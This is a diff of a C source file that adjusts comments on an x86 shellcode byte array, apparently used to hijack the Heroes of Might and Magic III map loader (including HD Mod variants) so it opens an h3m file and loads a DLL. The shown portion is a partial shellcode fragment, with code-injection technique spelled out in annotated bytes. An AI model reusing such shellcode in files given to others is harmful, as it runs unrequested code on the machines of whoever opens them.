@@ -158,12 +158,12 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0xCC,                                       // UNUSED
 /*c0:*/ 0x8D, 0x64, 0xE4, 0x80,                     // LEA ESP, [ESP - 80]
         0x60,                                       // PUSHAD
-        0x66, 0xBF, 0x6C, 0x02,                     // MOV DI, 26C
-        0x8B, 0x04, 0x3C,                           // MOV EAX, DWORD PTR SS:[EDI+ESP]
+        0x66, 0xBF, 0x6C, 0x02,                     // MOV DI, 26C      ; stack offset of "maps" string
+        0x8B, 0x04, 0x3C,                           // MOV EAX, DWORD PTR SS:[EDI + ESP]
         0x3C, 0x4C,                                 // CMP AL, 4C       ; compare HD Mod HD+ vs non-HD+
         0x75, 0x06,                                 // JNE SHORT <+7>   ; jumps to c1 for non-HD+
         0x83, 0xC7, 0x20,                           // ADD EDI,20       ; for HD+
-        0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI+ESP]
+        0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI + ESP]
 /*c1:*/ 0x50,                                       // PUSH EAX
         0xFF, 0x15, 0x04, 0xA2, 0x63, 0x00,         // CALL DWORD PTR DS:[<&KeRNeL32.SetCurrentDirectoryA>]
         0x31, 0xDB,                                 // XOR EBX,EBX
@@ -173,8 +173,8 @@ static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
         0x53,                                       // PUSH EBX
         0x6A, 0x03,                                 // PUSH 3
         0x68, 0x00, 0x00, 0x00, 0x80,               // PUSH 80000000
-        0x83, 0xC7, 0x1C,                           // ADD EDI,1C
-        0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI+ESP]
+        0x83, 0xC7, 0x1C,                           // ADD EDI,1C       ; point EDI to h3m filename
+        0x8B, 0x04, 0x3C,                           // MOV EAX,DWORD PTR SS:[EDI + ESP]
         0x50,                                       // PUSH EAX
         0xFF, 0x15, 0x08, 0xA1, 0x63, 0x00,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
         0x89, 0xC3,                                 // MOV EBX, EAX
